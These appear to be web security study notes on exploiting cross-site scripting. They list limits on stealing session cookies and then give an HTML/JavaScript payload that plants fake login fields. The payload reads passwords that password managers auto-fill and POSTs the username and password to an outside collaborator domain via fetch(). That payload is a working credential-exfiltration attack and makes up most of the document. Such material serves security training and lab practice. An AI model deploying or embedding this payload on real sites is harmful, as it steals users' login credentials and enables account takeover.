## Exploiting cross-site scripting to steal cookies
Limitations:
* The victim might not be logged in.
*  Many applications hide their cookies from JavaScript using the `HttpOnly` flag.
* Sessions might be locked to additional factors like the user's IP address.
* The session might time out before you're able to hijack it.

## Exploiting cross-site scripting to capture passwords
These days, many users have password managers that auto-fill their passwords. You can take advantage of this by creating a password input, reading out the auto-filled password, and sending it to your own domain.

```html
<input type="text" name="username">
<input type="password" name="password" onchange="dothis()">

<script>
    function dothis() {
    var username = document.getElementsByName('username')[0].value
    var password = document.getElementsByName('password')[0].value

    var data = new FormData();
    data.append('comment', `${username}:${password}`);

    fetch('https://ki68cr7k5a185wzf6dcqrlo63x9oxold.oastify.com', {
        method: 'POST',
        mode: 'no-cors',
        body: data
    });
    };
</script>
```
